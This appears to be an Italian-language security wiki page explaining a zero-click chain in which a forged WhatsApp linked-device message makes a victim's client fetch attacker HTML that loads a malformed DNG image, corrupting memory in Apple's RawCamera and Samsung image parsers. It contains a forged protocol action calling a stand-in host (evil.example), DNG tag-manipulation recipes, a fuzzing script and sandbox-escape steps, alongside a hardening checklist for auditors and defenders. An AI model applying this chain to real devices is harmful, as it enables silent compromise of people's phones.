# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Considera le **messaging app multi-device/companion protocols** come canali di controllo remoto: se si assume che i campi del protocollo provengano da dispositivi attendibili, essi possono comunque essere controllati dall'utente e spesso possono essere riprodotti direttamente contro una vittima per caricare contenuti arbitrari con **0 interazione dell'utente**.
- Una volta che qualsiasi app può essere costretta a recuperare media non attendibili, prendi di mira la pipeline multimediale condivisa del sistema operativo (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) con file malformati per pivotare fuori dal sandbox.
- I bug del parser DNG-based RawCamera e Samsung discussi qui sono esempi concreti, ma la tecnica completa è un blueprint riutilizzabile per concatenare **logic flaws → image parser memory corruption → full device compromise**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

L'architettura "linked devices" di WhatsApp mantiene il telefono primario e ogni companion (desktop, tablet, telefono secondario) sincronizzati tramite messaggi di protocollo strutturati e criptati. Ogni messaggio codifica:

- **Device metadata** (device ID, capabilities, feature flags).
- **Action descriptors** (e.g., sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** such as URIs, MIME hints, pagination keys, etc.

Sui client Apple, l'handler che elabora questi pacchetti di controllo linked-device **implicitamente si fidava** che un pairing valido fosse già avvenuto, quindi i campi ad alto impatto (es., `resource_url`, `open_media`, `sync_snapshot`) erano solo minimamente validati. Un messaggio companion malevolo potrebbe quindi:

1. Essere instradato verso qualsiasi account identificato dal suo numero di telefono.
2. Sopravvivere allo stack di trasporto (Noise protocol + WhatsApp protobuf framing) perché il ricevente non ha mai verificato che il mittente fosse un dispositivo legittimamente paired.
3. Raggiungere il client iOS, dove il percorso di codice vulnerabile attivava automaticamente una richiesta HTTP(S) in background verso l'URL dell'attaccante e analizzava la risposta in una WebView/media renderer nascosta.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Collega un debugger o uno script Frida al client desktop/iOS e inserisci un hook sull'handler post-decryption (es., `LinkedDevicesSyncHandler::processAction`). Dumpa i payload protobuf decodificati per apprendere i tipi di azione e i parametri disponibili.
2. **Identify fields that cross trust boundaries.** Qualsiasi azione che trasporta i parametri `http_url`, `thumbnail_uri`, `download_url` o `render_html` senza allow-list rigorose è un candidato come primitivo di contenuto remoto.
3. **Forge a malicious action.** Riutilizza lo schema protobuf osservato e modifica solo i campi controllati dall'attaccante. Una vista JSON semplificata della struttura logica rilevante è mostrata sotto (il trasporto reale è protobuf/Noise, ma i campi semantici corrispondono):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Consegnare alla vittima.** Replay del pacchetto creato attraverso lo stesso servizio WhatsApp che normalmente inoltra il traffico dei dispositivi collegati (es., usando un client desktop modificato o un client Noise personalizzato che riusa le chiavi dell'account dell'attaccante). Poiché CVE-2025-55177 non riusciva a legare le azioni ai dispositivi autenticati, il client iOS/macOS della vittima avrebbe accettato il messaggio e avrebbe immediatamente recuperato l'URL dell'attaccante senza alcuna UI.  
5. **Strumentare il fetch.** Osserva la richiesta HTTP(S) forzata e il renderer interno (WKWebView/ImageIO). A questo punto hai a disposizione una primitive di web delivery zero-click all'interno di WhatsApp.

## Strumentalizzare DNG auto-decodificati contro RawCamera

Una volta che l'attaccante controlla ciò che WhatsApp carica, l'obiettivo successivo è far sì che iOS/macOS analizzi un file malevolo **Digital Negative (DNG)** tramite il framework **RawCamera**. Qualsiasi URL embedded in `<img>`/CSS che risolve in un `.dng` verrà passato alla pipeline di gestione immagini di sistema, invocando RawCamera anche se WhatsApp stesso non ha mai gestito esplicitamente i DNG.

### Innescare RawCamera da WhatsApp

- Servi HTML che richiama il DNG tramite meccanismi multipli (es., `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, o sorgenti `<picture>`) per coprire diversi percorsi di rendering.
- Assicurati del MIME corretto (`image/x-adobe-dng`) e di anteprime piccole in modo che il loader non interrompa anticipatamente per euristiche di dimensione.
- La media sandbox di iOS effettuerà lo streaming del file in RawCamera tramite `CGImageSourceCreateWithURL`, arrivando infine al decoder vulnerabile.

### Creare DNG che corrompono la memoria (stile CVE-2025-43300)

Il bug riprodotto si basava su metadata incoerenti che desincronizzavano l'allocazione del buffer dalla reale lettura dei pixel. Le leve tipiche includono:

- **Tile/strip descriptors**: Imposta `TileByteCounts`/`StripByteCounts` su valori realistici ma aumenta `TileOffsets` in modo da puntare oltre il buffer allocato.
- **Sub-IFD chains**: Includi immagini secondarie con `ImageWidth`/`ImageLength` e `BitsPerSample` in conflitto in modo che RawCamera calcoli un buffer piccolo mentre fasi successive si fidano di dimensioni controllate dall'attaccante.
- **Opcode metadata**: Manipola le voci di `OpcodeList3` in modo che l'elaborazione per riga operi su indici scelti dall'attaccante.

Un semplice harness di mutazione per cercare tali corruzioni può essere costruito su macOS, dato che lo stesso codice RawCamera è distribuito su macOS/iOS/iPadOS:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Ogni crash in `RawCamera` ti fornisce un nuovo primitivo. Il PoC pubblicato ha ottenuto un robusto out-of-bounds read/write sufficientemente affidabile da far crashare WhatsApp su iPhone, iPad e Mac.

## Costruire la catena 0-click

1. **Linked-device packet** → costringe WhatsApp a recuperare `https://evil.example/payload.html` senza alcun tap.
2. **Payload HTML** → fa riferimento silenziosamente a `evil.dng`, garantendo che RawCamera venga invocato dallo stack multimediale del sistema operativo.
3. **Malicious DNG** → sfrutta tag appositamente creati per attivare il RawCamera OOB e causare il crash/compromettere il decoder d'immagini.
4. **Post-corruption exploitation** → aggiungere info-leak gadgets (es. abusando di heap metadata predicibili) e allestire una catena ROP/JOP per evadere dalla WhatsApp sandbox e ottenere contesti con privilegi superiori.

Poiché ogni passaggio è automatico, l'attaccante ha bisogno solo del numero di telefono della vittima. Nessuna notifica, banner o richiesta viene mostrata sul dispositivo target.

## Paralleli nel parser di immagini vendor di Samsung

Il bollettino di Samsung per CVE-2025-21043 ha confermato che il loro stack proprietario di parsing delle immagini (usato da Gallery, Messages e anche indirettamente da WhatsApp) ha subito un **out-of-bounds write** raggiungibile tramite media non attendibili. La metodologia di sfruttamento rispecchia la catena Apple:

- Identificare un vettore di auto-preview (chat thumbnails, notification previews, share sheets) che esegue il parsing del file dell'attaccante usando le librerie di Samsung `libimagecodec`/`libOneUI_ImageDecoder`.
- Fare diff degli aggiornamenti delle librerie OEM o fuzzare i parser con file RAW/DNG malformati finché non si osservano corruzioni di memoria simili al crash di RawCamera (heap metadata clobber, controllo dei registri, ecc.).
- Consegnare il file creato tramite qualsiasi canale che già carica contenuti automaticamente (es. lo stesso linked-device primitive, WhatsApp preview fetchers, o le preview waveform push-to-talk di Android).

Una volta che esiste un OOB write nel parser vendor, combinarlo con il WhatsApp auto-fetch primitive genera un'altra catena zero-click sui dispositivi Samsung.

## Checklist per testing e hardening

- **Protocol validation**: Applicare allow-list rigorose per ogni azione linked-device. I comandi companion che richiedono un fetch/render devono dimostrare l'accoppiamento del dispositivo (firmando il payload) e l'URL dovrebbe corrispondere a un allow-list o a un blob firmato.
- **Transport replay countermeasures**: Legare ogni azione a una chiave per dispositivo e rifiutare pacchetti il cui sender key sia sconosciuto, anche se la sintassi protobuf è corretta.
- **Media pipeline restrictions**: Le app di alto livello dovrebbero permettere solo MIME type approvati e rifiutare esplicitamente RAW/DNG a meno che la funzione non sia necessaria.
- **Parser fuzzing regression tests**: Mantenere una corpora di file RAW/DNG malformati ed eseguirli contro i decoder RawCamera/vendor dopo ogni aggiornamento.
- **Crash triage automation**: Allegare sanitizers `DYLD_INSERT_LIBRARIES` o MTE sui dispositivi di fuzzing per catturare condizioni OOB sottili prima che lo facciano gli attaccanti.

## Riferimenti

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
